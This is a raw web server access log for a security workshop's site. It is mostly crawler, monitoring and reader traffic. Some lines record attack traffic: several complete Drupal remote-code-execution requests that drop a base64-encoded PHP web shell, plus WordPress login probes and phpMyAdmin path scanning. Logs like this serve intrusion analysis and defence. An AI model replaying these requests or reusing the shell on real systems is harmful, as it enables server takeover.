www.nspw.org:80 203.133.169.137 - - [01/May/2018:17:32:44 -0400] "GET /proceedings HTTP/1.1" 302 510 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 203.133.169.137 - - [01/May/2018:17:33:01 -0400] "GET / HTTP/1.1" 302 492 "-" "Mozilla/5.0 (compatible; Daum/4.1; +http://cs.daum.net/faq/15/4118.html?faqId=28966)"
www.nspw.org:80 216.244.66.236 - - [01/May/2018:17:33:02 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:35:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 186.136.248.8 - - [01/May/2018:17:38:55 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 186.136.248.8 - - [01/May/2018:17:38:57 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:40:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:17:41:48 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 199.59.150.183 - - [01/May/2018:17:43:55 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.59.150.183 - - [01/May/2018:17:43:56 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:45:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 185.244.25.162 - - [01/May/2018:17:48:02 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.19.7"
www.nspw.org:80 185.244.25.162 - - [01/May/2018:17:48:02 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.19.7"
www.nspw.org:80 123.125.71.23 - - [01/May/2018:17:48:34 -0400] "GET /current/cfp/flyer_NSPW_2013.pdf HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 121.97.46.251 - - [01/May/2018:17:49:46 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 121.97.46.251 - - [01/May/2018:17:49:53 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:50:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 146.95.192.179 - - [01/May/2018:17:52:34 -0400] "GET /papers/2011/nspw2011-feigenbaum.pdf HTTP/1.1" 302 599 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:17:53:41 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 95.120.22.254 - - [01/May/2018:17:54:13 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.120.22.254 - - [01/May/2018:17:54:15 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:17:55:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.69.8 - - [01/May/2018:17:56:21 -0400] "GET /2017/program HTTP/1.1" 302 564 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 92.167.85.217 - - [01/May/2018:17:56:56 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 92.167.85.217 - - [01/May/2018:17:56:56 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:00:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.36.148.60 - - [01/May/2018:18:04:07 -0400] "GET /papers/2002/?C=M;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:05:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:10:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 41.109.247.86 - - [01/May/2018:18:10:58 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.109.247.86 - - [01/May/2018:18:11:01 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 37.214.176.217 - - [01/May/2018:18:11:29 -0400] "GET / HTTP/1.0" 302 492 "http://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47 (Edition Yx)"
www.nspw.org:80 199.16.157.183 - - [01/May/2018:18:14:02 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.183 - - [01/May/2018:18:14:03 -0400] "GET /2018/organizers HTTP/1.1" 302 499 "-" "Twitterbot/1.0"
www.nspw.org:80 199.19.248.219 - - [01/May/2018:18:14:05 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 302 585 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:18:15:01 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:15:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 185.200.214.31 - - [01/May/2018:18:15:41 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 185.200.214.31 - - [01/May/2018:18:15:41 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 81.109.41.75 - - [01/May/2018:18:18:26 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 81.109.41.75 - - [01/May/2018:18:18:27 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 131.107.174.143 - - [01/May/2018:18:20:15 -0400] "GET /2018/organizers HTTP/1.1" 302 555 "https://t.co/gWNBXtdVTl" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
www.nspw.org:80 ::1 - - [01/May/2018:18:20:23 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:18:20:24 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:18:20:25 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:18:20:26 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:18:20:27 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:18:20:28 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:20:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 ::1 - - [01/May/2018:18:20:38 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 131.107.174.143 - - [01/May/2018:18:21:06 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:18:22:42 -0400] "GET /2001/cfp.html HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 138.197.72.0 - - [01/May/2018:18:23:48 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Go-http-client/1.1"
www.nspw.org:80 138.197.72.0 - - [01/May/2018:18:23:49 -0400] "GET /2003/oldindex.html HTTP/1.1" 302 505 "-" "VelenPublicWebCrawler (velen.io)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:25:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:18:25:56 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 35.226.23.240 - - [01/May/2018:18:28:15 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:30:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:35:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:18:36:39 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:18:36:53 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 138.36.227.6 - - [01/May/2018:18:37:55 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 138.36.227.6 - - [01/May/2018:18:37:56 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:40:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 189.190.56.149 - - [01/May/2018:18:40:35 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 189.190.56.149 - - [01/May/2018:18:40:37 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.62.89.230 - - [01/May/2018:18:40:53 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.62.89.230 - - [01/May/2018:18:40:54 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 191.187.211.164 - - [01/May/2018:18:42:12 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 191.187.211.164 - - [01/May/2018:18:42:13 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 ::1 - - [01/May/2018:18:45:13 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:18:45:14 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 ::1 - - [01/May/2018:18:45:15 -0400] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.0g (internal dummy connection)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:45:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 179.254.166.128 - - [01/May/2018:18:45:42 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.254.166.128 - - [01/May/2018:18:45:47 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:18:46:30 -0400] "GET /2005/cfp/latex/ HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 167.249.209.35 - - [01/May/2018:18:46:32 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 167.249.209.35 - - [01/May/2018:18:46:36 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.19.194.19 - - [01/May/2018:18:47:16 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 82.19.194.19 - - [01/May/2018:18:47:17 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 220.181.108.139 - - [01/May/2018:18:47:25 -0400] "GET /papers/2002/nspw2002-du.pdf HTTP/1.1" 302 523 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 220.181.108.145 - - [01/May/2018:18:47:27 -0400] "GET /papers/2002/nspw2002-du.pdf HTTP/1.1" 302 523 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 220.181.108.181 - - [01/May/2018:18:47:29 -0400] "GET /papers/2002/nspw2002-du.pdf HTTP/1.1" 302 523 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:18:48:37 -0400] "GET /2009/proceedings/1993/?C=M;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:18:48:47 -0400] "GET /2009/proceedings/1996/?C=D;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:50:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 169.54.233.118 - - [01/May/2018:18:51:38 -0400] "GET / HTTP/1.1\n" 400 0 "-" "-"
www.nspw.org:80 40.77.167.65 - - [01/May/2018:18:55:09 -0400] "GET /papers/1996/nspw1996-chuang.pdf HTTP/1.1" 302 587 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:18:55:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 77.239.10.9 - - [01/May/2018:18:56:23 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 54.36.149.53 - - [01/May/2018:18:56:24 -0400] "GET /2014 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 77.239.10.9 - - [01/May/2018:18:56:24 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.199.26.139 - - [01/May/2018:18:56:47 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 109.199.26.139 - - [01/May/2018:18:56:47 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:14 -0400] "GET /index.php HTTP/1.0" 302 549 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:14 -0400] "GET /phpmyadmin/index.php HTTP/1.0" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:14 -0400] "GET /phpMyAdmin/index.php HTTP/1.0" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:14 -0400] "GET /pmd/index.php HTTP/1.0" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:14 -0400] "GET /pma/index.php HTTP/1.0" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:14 -0400] "GET /PMA/index.php HTTP/1.0" 302 556 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:14 -0400] "GET /PMA2/index.php HTTP/1.0" 302 558 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /pmamy/index.php HTTP/1.0" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /pmamy2/index.php HTTP/1.0" 302 562 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /mysql/index.php HTTP/1.0" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /admin/index.php HTTP/1.0" 302 560 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /db/index.php HTTP/1.0" 302 554 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /dbadmin/index.php HTTP/1.0" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /web/phpMyAdmin/index.php HTTP/1.0" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:15 -0400] "GET /admin/pma/index.php HTTP/1.0" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /admin/PMA/index.php HTTP/1.0" 302 568 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /admin/mysql/index.php HTTP/1.0" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /admin/mysql2/index.php HTTP/1.0" 302 574 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /admin/phpmyadmin/index.php HTTP/1.0" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /admin/phpMyAdmin/index.php HTTP/1.0" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /admin/phpmyadmin2/index.php HTTP/1.0" 302 584 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /mysqladmin/index.php HTTP/1.0" 302 570 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /mysql-admin/index.php HTTP/1.0" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:16 -0400] "GET /phpadmin/index.php HTTP/1.0" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /phpmyadmin0/index.php HTTP/1.0" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /phpmyadmin1/index.php HTTP/1.0" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /phpmyadmin2/index.php HTTP/1.0" 302 572 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /myadmin/index.php HTTP/1.0" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /myadmin2/index.php HTTP/1.0" 302 566 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /xampp/phpmyadmin/index.php HTTP/1.0" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /phpMyadmin_bak/index.php HTTP/1.0" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:17 -0400] "GET /www/phpMyAdmin/index.php HTTP/1.0" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /tools/phpMyAdmin/index.php HTTP/1.0" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /phpmyadmin-old/index.php HTTP/1.0" 302 578 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /pma-old/index.php HTTP/1.0" 302 564 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /claroline/phpMyAdmin/index.php HTTP/1.0" 302 590 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /typo3/phpmyadmin/index.php HTTP/1.0" 302 582 "-" "Mozilla/5.0"
www.nspw.org:80 87.98.163.30 - - [01/May/2018:18:59:18 -0400] "GET /phpma/index.php HTTP/1.0" 302 560 "-" "Mozilla/5.0"
